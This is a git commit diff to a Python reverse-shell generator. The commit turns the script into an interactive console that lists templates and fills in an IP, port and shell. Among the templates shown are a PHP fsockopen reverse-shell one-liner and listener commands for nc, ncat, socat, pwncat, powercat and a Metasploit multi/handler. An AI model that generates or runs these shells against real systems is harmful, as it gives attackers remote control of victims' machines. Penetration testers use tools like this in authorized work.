17b8eb8cfc9b12e8c9618f134e4e4bab8c228ebc
totekuh <downtownxore@gmail.com>
2021-12-16 22:09:52 +0100

    seems to work...

--- revshellgenerator.py
+++ revshellgenerator.py
@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
-from string import Template
+from cmd import Cmd
+import os
+from termcolor import colored
 
 bind_shell_commands = [
     {
@@ -151,7 +153,7 @@ reverse_shell_commands = [
         "meta": ["linux", "mac"]
     },
     {
-        "name": "PHP `",
+        "name": "PHP",
         "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
         "meta": ["linux", "windows", "mac"]
     },
@@ -395,19 +397,19 @@ msf_venom_commands = [
 ]
 
 listener_commands = [
-    ['nc', 'nc -lvnp {port}'],
-    ['ncat', 'ncat -lvnp {port}'],
-    ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
-    ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
-    ['rustcat', 'rcat -lp {port}'],
-    ['rustcat + Command History', 'rcat -lHp {port}'],
-    ['pwncat', 'python3 -m pwncat -lp {port}'],
-    ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
-    ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
-    ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
-    ['powercat', 'powercat -l -p {port}'],
-    ['msfconsole',
-     'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
+    {'name': 'nc', 'command': 'nc -lvnp {port}'},
+    {'name': 'ncat', 'command': 'ncat -lvnp {port}'},
+    {'name': 'ncat (TLS)', 'command': 'ncat --ssl -lvnp {port}'},
+    {'name': 'rlwrap + nc', 'command': 'rlwrap -cAr nc -lvnp {port}'},
+    {'name': 'rustcat', 'command': 'rcat -lp {port}'},
+    {'name': 'rustcat + Command History', 'command': 'rcat -lHp {port}'},
+    {'name': 'pwncat', 'command': 'python3 -m pwncat -lp {port}'},
+    {'name': 'windows ConPty', 'command': 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'},
+    {'name': 'socat', 'command': 'socat -d -d TCP-LISTEN:{port} STDOUT'},
+    {'name': 'socat (TTY)', 'command': 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'},
+    {'name': 'powercat', 'command': 'powercat -l -p {port}'},
+    {'name': 'msfconsole',
+     'command': 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'}
 ]
 
 shells = ['sh',
@@ -425,42 +427,183 @@ shells = ['sh',
           'pdksh',
           'tcsh']
 
+from ipaddress import ip_address
 
-def get_arguments():
-    from argparse import ArgumentParser
-    parser = ArgumentParser(description="Reverse Shell Generator Script")
-    parser.add_argument('--ip',
-                        dest='ip',
-                        required=True,
-                        type=str,
-                        help="Specify the IP address for the reverse shell command")
-    parser.add_argument('--port',
-                        dest='port',
-                        required=True,
-                        type=int,
-                        help="Specify the TCP port for the reverse shell command")
-    parser.add_argument('--shell',
-                        dest='shell',
-                        choices=shells,
-                        required=False,
-                        default='/bin/sh',
-                        type=str,
-                        help="Specify the shell to use. "
-                             "Default is '/bin/sh'.")
-    options = parser.parse_args()
-    return options
+
+class ReverseShellGenerator(Cmd):
+    intro: str = colored(
+        "Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.", 'yellow')
+    prompt: str = colored(">> ", 'yellow')
+    ip: str = None
+    port: int = None
+    shell: str = '/bin/sh'
+
+    REVERSE = 'reverse'
+    LISTENERS = 'listeners'
+    SHELLS = 'shells'
+    list_actions = [REVERSE, LISTENERS, SHELLS]
+
+    def do_ip(self, ip: str):
+        if ip:
+            try:
+                ip_address(ip)
+            except Exception as e:
+                print(colored(f"{e}", 'red'))
+                return
+            self.ip = ip
+            print(colored(f"The IP address has been set as '{self.ip}'", 'green'))
+        else:
+            print(colored('The IP address must not be empty', 'red'))
+
+    def do_port(self, port: str):
+        if port:
+            try:
+                port = int(port)
+            except Exception:
+                print(colored('The port value must be an integer', 'red'))
+                return
+            if port <= 0 or port > 65535:
+                print(colored("The port value must in range between 0 and 65535", 'green'))
+                return
+            self.port = port
+            print(colored(f"The port has been set as '{self.port}'", 'green'))
+        else:
+            print(colored('The port value must not be empty', 'red'))
+
+    def do_shell(self, shell):
+        if shell:
+            if shell not in shells:
+                print(colored("No such shell found. Use 'list shells' to see available ones."))
+                return
+            self.shell = shell
+            print(colored(f"The shell has been set as '{self.shell}'", 'green'))
+        else:
+            print(colored('The shell name must not be empty', 'red'))
+
+    def do_list(self, item: str):
+        if not item:
+            print(colored("You must give something to list first. "
+                          "Use 'help list' to see available items.",
+                          "red"))
+            return
+        if item not in self.list_actions:
+            print(colored(f"'{item}' is not a valid item to list,"
+                          f" use one of {self.list_actions} instead", 'red'))
+        else:
+            if item == self.REVERSE:
+                for i, reverse in enumerate(reverse_shell_commands):
+                    meta = colored(f"[{' | '.join(reverse['meta'])}]", 'red')
+                    print(colored(f"{i} - {reverse['name']} {meta}", 'yellow'))
+            elif item == self.LISTENERS:
+                for i, listener in enumerate(listener_commands):
+                    print(colored(f"{i} - {listener['name']}", 'yellow'))
+            elif item == self.SHELLS:
+                for i, shell in enumerate(shells):
+                    print(colored(f"{i} - {shell}", 'yellow'))
+
+    def do_get(self, command: str):
+        if not self.ip:
+            print(colored("The IP address must be set before generating the command. "
+                          "Use 'ip <ip_address>' to set it.", "red"))
+            return
+        if not self.port:
+            print(colored("The port must be set before generating the command. "
+                          "Use 'port <port>' for setting it.", "red"))
+            return
+        invalid_item_message = os.linesep.join([colored('Invalid command. It needs to be as follows:', 'red'),
+                                                colored(f'get [ {" | ".join(self.list_actions)} ] [index]', 'yellow'),
+                                                '',
+                                                colored(f"E.g.: get reverse 0", 'yellow')])
+        if ' ' not in command:
+            print(invalid_item_message)
+            return
+        chunks = command.split(' ')
+        if len(chunks) != 2:
+            print(invalid_item_message)
+            return
+        else:
+            item = chunks[0]
+            try:
+                index = int(chunks[1])
+            except Exception:
+                print(invalid_item_message)
+                return
+            template = self.get_command_by_index(item, index)
+            if template:
+                generated_command = self.generate_command(template)
+                print(generated_command)
+
+    def generate_command(self, template: str):
+        return template.replace("{ip}", self.ip) \
+            .replace("{port}", f"{self.port}") \
+            .replace("{shell}", self.shell)
+
+    def get_command_by_index(self, item: str, index: int):
+        no_such_index_error_message = colored(f"There is no such {item} with index {index}", 'red')
+
+        def get_item_from_list(items_list: list, attribute: str, index: int):
+            try:
+                command = items_list[index]
+                return command[attribute]
+            except IndexError:
+                print(no_such_index_error_message)
+                return
+
+        if item == self.REVERSE:
+            return get_item_from_list(reverse_shell_commands, 'command', index)
+        elif item == self.LISTENERS:
+            return get_item_from_list(listener_commands, 'command', index)
+        elif item == self.SHELLS:
+            return get_item_from_list(shells, 'command', index)
+
+    def help_ip(self):
+        print(colored(os.linesep.join(['ip [ip_address]',
+                                       'Use the given IP address as the reverse shell IP address',
+                                       ]), 'yellow'))
+
+    def help_port(self):
+        print(colored(os.linesep.join(['port [port]',
+                                       'Use the given port as the reverse port',
+                                       ]), 'yellow'))
+
+    def help_shell(self):
+        print(colored(os.linesep.join([f'shell [ {" | ".join(shells)} ]',
+                                       'Set the desired shell to be used in the generated reverse shell command. ',
+                                       'E.g.: shell /bin/sh',
+                                       ]), 'yellow'))
+
+    def help_list(self):
+        print(colored(os.linesep.join([f'list [ {" | ".join(self.list_actions)} ]',
+                                       'List the available templates, shells or listener commands. ',
+                                       'E.g.: list shells',
+                                       ]), 'yellow'))
+
+    def help_get(self):
+        print(colored(os.linesep.join([f'get [ {" | ".join(self.list_actions)} ] [index]',
+                                       'Generate the actual command with the given options. ',
+                                       '',
+                                       "The first parameter specifies which type of the command it's going to be.",
+                                       "The [index] parameter specifies which template should be used for generating "
+                                       "the command. ",
+                                       '',
+                                       "Use 'list' command for getting the index."
+                                       ]), 'yellow'))
 
 
 def main():
-    options = get_arguments()
+    ReverseShellGenerator().cmdloop()
 
-    for shell in reverse_shell_commands:
-        command = shell['command'] \
-            .replace("{ip}", options.ip) \
-            .replace("{port}", f"{options.port}") \
-            .replace("{shell}", options.shell)
-        print(command)
+    # for shell in reverse_shell_commands:
+    #     command = shell['command'] \
+    #         .replace("{ip}", options.ip) \
+    #         .replace("{port}", f"{options.port}") \
+    #         .replace("{shell}", options.shell)
+    #     print(command)
 
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(os.linesep)
+        print('Bye')
